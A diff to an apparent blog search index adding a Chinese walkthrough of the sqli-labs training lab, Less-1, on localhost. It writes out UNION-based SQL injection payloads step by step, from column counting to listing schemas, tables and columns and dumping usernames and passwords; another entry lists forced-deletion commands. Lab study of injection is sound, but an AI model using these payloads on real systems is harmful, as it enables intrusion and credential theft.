@@ -64,6 +64,17 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[sqli-lab]]></title>
+    <url>%2F2018%2F05%2F01%2Fsqli-lab%2F</url>
+    <content type="text"><![CDATA[1、 sqli-labs需要lamp或wamp环境，本机使用wamp环境，使用phpstudy的集成环境2、 Sqli-labs的安装，下载sqli-labs，解压到本地www目录下，打开WWW\sqli-labs\sql-connections文件下的db-creds.inc文件，修改mysql账户和密码和本机mysql数据库账户和密码一致3、 浏览器输入http://127.0.0.1/sqli-labs，单击Setup/reset Database for labs此时sqli-labs平台已经搭建好了选择第一关，让输入一个参数进入，那就先传入?id=1吧1、先判断是字符型还是整数型http://127.0.0.1/sqli-labs/Less-1/?id=1http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;进一步判断，http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and ‘1’=’1 ，页面正常http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and ‘1’=’2确定是字符型注入2、判断查询列数http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 4–+报错，未知的4列，那就试一下3http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 3–+现在知道是有三列了3、判断显示位http://127.0.0.1/sqli-labs/Less-1/?id=-1‘ union select 1,2,3–+查询所使用的数据库，以及数据库版本，大于5.0版本的数据库存在information_schema库,http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),version()–+4、 获取所有数据库名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),2–+ 5、 获取数据库所有表名Sqli-labs使用的数据库是security查询数据库中所有表：http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),2–+ 6、 获取表中所有字段Users表中存放用户信息，来查看一下http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),2–+发现有三个字段，7、 获取字段中的数据http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select concat_ws(char(32,58),id,username,password) from users limit 1,1),2–+一次获取一个账户信息，通过limit 0,1 第一个参数控制第n-1个id，第二个参数控制显示行数]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>Security</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Windows使用问题]]></title>
     <url>%2F2018%2F04%2F22%2Foffice%2F</url>
     <content type="text"><![CDATA[office的问题Office打开文件问题解决此问题，先左击该文件，再右击属性，右下角文件属性，解除锁定 问题解决 两行文字之间有空白段PDF转为word的文件，两行文字之间有空白段，但是按删除键却删除不了，这是由于文档中插入了分页符，我们需要删除分页符 删除分页符方法：第三步处，鼠标移至分页符前面按下Delete键即可删除此段空白 windows管理员权限删除文件依然删除不掉电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件rd /s /q 文件夹del /F /S /Q 文件夹]]></content>
